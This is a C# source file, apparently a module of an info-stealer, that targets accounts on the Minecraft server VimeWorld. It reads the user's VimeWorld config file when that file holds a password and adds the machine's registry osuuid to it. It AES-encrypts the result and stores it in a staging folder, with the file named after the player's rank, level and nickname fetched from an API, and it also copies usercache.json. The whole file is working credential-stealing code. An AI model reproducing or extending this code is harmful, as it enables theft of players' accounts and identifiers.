using System;
using System.IO;
using System.Net;
using System.Text;
using Microsoft.Win32;

namespace exos;

internal class Vime
{
	public static string patchConfig = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\.vimeworld", "config");

	public static string InfoPlayer;

	public static void nameslegacy()
	{
		string exploitDir = Helper.ExploitDir;
		string text = Path.Combine("C:\\Minecraft\\game", "usercache.json");
		if (File.Exists(text))
		{
			string destFileName = Path.Combine(exploitDir, "usercache.json");
			File.Copy(text, destFileName, overwrite: true);
		}
	}

	public static void Get()
	{
		try
		{
			string exploitDir = Helper.ExploitDir;
			if (!File.Exists(patchConfig))
			{
				return;
			}
			string text;
			using (StreamReader streamReader = new StreamReader(patchConfig))
			{
				text = streamReader.ReadToEnd();
			}
			if (text.Contains("password"))
			{
				string text2 = exploitDir + "\\VimeWorld";
				Directory.CreateDirectory(text2);
				if (cfg.VimeWorld)
				{
					InfoPlayer = new WebClient().DownloadString(Helper.VimeAPI + NickName());
				}
				string path = Path.Combine(text2, (cfg.VimeWorld ? (Donate() + Level()) : "") + NickName());
				text = text + "||||" + OSSUID();
				text = AES.EncryptStringAES(text, cfg.key);
				using (StreamWriter streamWriter = new StreamWriter(path))
				{
					streamWriter.WriteLine(text);
				}
				Counting.VimeWorld++;
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex?.ToString() + "Ошибка с Vime.Get");
		}
	}

	public static string Level()
	{
		string infoPlayer = InfoPlayer;
		int num = infoPlayer.IndexOf("\"level\":");
		string text = infoPlayer.Substring(num + 8);
		string text2 = text[..text.IndexOf(",")];
		return "[" + text2 + "]";
	}

	public static string Donate()
	{
		string infoPlayer = InfoPlayer;
		int num = infoPlayer.IndexOf("\"rank\":");
		string text = infoPlayer.Substring(num + 8);
		string text2 = text[..text.IndexOf("\"")];
		return "[" + text2 + "]";
	}

	public static string OSSUID()
	{
		try
		{
			return Registry.CurrentUser.OpenSubKey("Software\\VimeWorld").GetValue("osuuid") as string;
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex?.ToString() + "Ошибка с OSSUID");
			return "Error";
		}
	}

	public static string NickName()
	{
		try
		{
			string text = "Error";
			StreamReader streamReader = new StreamReader(patchConfig, Encoding.Default);
			while (!streamReader.EndOfStream)
			{
				text = streamReader.ReadLine();
				if (text.StartsWith("username:"))
				{
					text = text.Substring(text.IndexOf(':') + 1);
					break;
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex?.ToString() + "ошибка NickName");
			return "Error";
		}
	}
}
